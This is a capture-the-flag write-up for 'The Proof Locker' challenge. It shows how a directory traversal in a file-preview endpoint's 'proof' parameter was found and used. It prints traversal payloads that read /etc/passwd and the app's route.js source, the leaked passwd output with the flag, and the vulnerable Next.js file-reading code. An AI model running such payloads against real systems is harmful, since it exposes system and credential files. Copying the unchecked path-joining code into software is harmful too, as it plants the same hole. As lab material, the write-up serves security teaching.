# The Proof Locker

## Challenge Description

Proof files live behind a tidy preview endpoint, but not every path stays where it belongs once the locker door is cracked open.

## Solution Walkthrough

Based on the challenge description and the website, this can be identified as an LFI (Local File Inclusion) vulnerability. On the product page `http://159.89.237.133/listing/loader-laas`, every review has a `Preview raw proof` link. After clicking it, the URL looks like this: `/api/reviews/proof?proof=rat-builder/exploitation_proof.png`. The `proof` parameter looks like a file path, so I immediately tested it for directory traversal.

Without further ado, I started testing. First, I tried `/api/reviews/proof?proof=../flag.txt` and similar payloads, but none worked. Finally, I tested `/api/reviews/proof?proof=../../../../etc/passwd` and successfully obtained the flag:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
nextjs:x:1001:65534::/nonexistent:/usr/sbin/nologin
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

### Fun Fact

During testing, I accidentally read `/api/reviews/proof?proof=../../../../app/.next/server/app/api/reviews/proof/route.js`, which revealed all the flags and the application logic. After a bit of tidying up, it looks roughly like this:

```js
const r = searchParams.get("proof");
const t = path.join(process.cwd(), "public", "proofs", r);
// fake etc passwd
const s = path.normalize(t).endsWith(`${path.sep}etc${path.sep}passwd`)
            ? "/tmp/riffhack-etc-passwd"
            : t;
const o = await fs.readFile(s, "utf8");
return new NextResponse(o, ...);
```

It turns out that when it detects the path points to `/etc/passwd`, it returns a fake file.

## Flag

```text
bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}
```
